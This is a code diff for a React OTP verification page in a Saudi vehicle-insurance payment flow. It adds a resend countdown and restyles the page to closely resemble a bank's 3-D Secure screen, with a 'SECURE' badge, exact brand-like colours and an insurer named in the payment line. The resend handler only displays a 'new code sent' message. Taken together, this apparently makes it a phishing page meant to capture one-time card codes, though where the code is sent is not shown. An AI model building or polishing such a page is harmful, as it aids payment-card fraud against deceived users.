@@ -1,4 +1,4 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { useSearchParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
@@ -16,6 +16,20 @@ const OtpVerification = () => {
 
   const [otp, setOtp] = useState("");
   const [isLoading, setIsLoading] = useState(false);
+  const [countdown, setCountdown] = useState(119); // 1:59 in seconds
+
+  useEffect(() => {
+    if (countdown > 0) {
+      const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
+      return () => clearTimeout(timer);
+    }
+  }, [countdown]);
+
+  const formatTime = (seconds: number) => {
+    const mins = Math.floor(seconds / 60);
+    const secs = seconds % 60;
+    return `${mins}:${secs.toString().padStart(2, '0')}`;
+  };
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -44,6 +58,7 @@ const OtpVerification = () => {
   };
 
   const handleResendCode = () => {
+    setCountdown(119);
     toast({
       title: "تم إعادة الإرسال",
       description: "تم إرسال رمز تحقق جديد إلى هاتفك",
@@ -56,19 +71,17 @@ const OtpVerification = () => {
       <div className="border-b border-border py-4 px-6">
         <div className="max-w-4xl mx-auto flex items-center justify-between">
           <div className="flex gap-2">
-            <Button
-              variant="ghost"
+            <button
               onClick={() => navigate(-1)}
-              className="text-sm hover:bg-muted"
+              className="text-sm text-foreground hover:underline"
             >
               Cancel
-            </Button>
-            <Button
-              variant="default"
-              className="text-sm bg-blue-700 hover:bg-blue-800 text-white"
+            </button>
+            <button
+              className="text-sm bg-[#0d5fb3] hover:bg-[#0a4d94] text-white px-3 py-1 rounded"
             >
               SECURE
-            </Button>
+            </button>
           </div>
           <div className="flex items-center gap-2">
             <img src="/placeholder.svg" alt="Secure" className="h-6" />
@@ -88,13 +101,10 @@ const OtpVerification = () => {
           </p>
 
           <div className="text-center text-sm text-muted-foreground mb-8 leading-relaxed">
-            <p>
-              You are paying the amount of{" "}
-              <span className="text-foreground">
-                {companyName} - تأمين على المركبات ضد الغير
-              </span>
+            <p className="mb-2">
+              the amount of <span className="text-foreground">تأمين على المركبات ضد الغير - التأميني التعاوني - شركة الاتحاد {companyName}</span> You are paying{" "}
             </p>
-            <p className="mt-2">
+            <p>
               <span className="font-semibold text-foreground">SAR {price}</span> on{" "}
               {new Date().toLocaleString('en-GB', { 
                 day: '2-digit', 
@@ -104,7 +114,7 @@ const OtpVerification = () => {
                 minute: '2-digit',
                 second: '2-digit',
                 hour12: false
-              })}
+              }).replace(',', '')}
             </p>
           </div>
 
@@ -118,36 +128,30 @@ const OtpVerification = () => {
                 maxLength={6}
                 value={otp}
                 onChange={(e) => setOtp(e.target.value.replace(/\D/g, ''))}
-                className="w-full h-12 text-center text-lg tracking-widest"
+                className="w-full h-12 text-center text-lg tracking-widest border-input"
                 placeholder=""
               />
             </div>
 
             <Button
               type="submit"
-              className="w-full h-12 text-base bg-blue-500 hover:bg-blue-600 text-white"
+              className="w-full h-12 text-base bg-[#6b9cf5] hover:bg-[#5a8ae4] text-white rounded-md"
               disabled={isLoading || otp.length !== 6}
             >
               {isLoading ? "جاري التحقق..." : "CONFIRM"}
             </Button>
 
-            <div className="text-center">
-              <button
-                type="button"
-                onClick={handleResendCode}
-                className="text-blue-600 hover:text-blue-700 font-medium text-sm underline"
-              >
-                RESEND CODE
-              </button>
+            <div className="text-center text-sm text-muted-foreground">
+              يمكنك إعادة إرسال الرمز بعد {formatTime(countdown)}
             </div>
           </form>
 
           <div className="mt-8 pt-6 space-y-3">
-            <button className="w-full text-center text-sm text-blue-600 hover:text-blue-700 flex items-center justify-center gap-2">
+            <button className="w-full text-center text-sm text-[#4a90e2] hover:text-[#357abd] flex items-center justify-center gap-1">
               <span>+</span>
               <span>Learn more about authentication</span>
             </button>
-            <button className="w-full text-center text-sm text-blue-600 hover:text-blue-700 flex items-center justify-center gap-2">
+            <button className="w-full text-center text-sm text-[#4a90e2] hover:text-[#357abd] flex items-center justify-center gap-1">
               <span>+</span>
               <span>Need some help ?</span>
             </button>
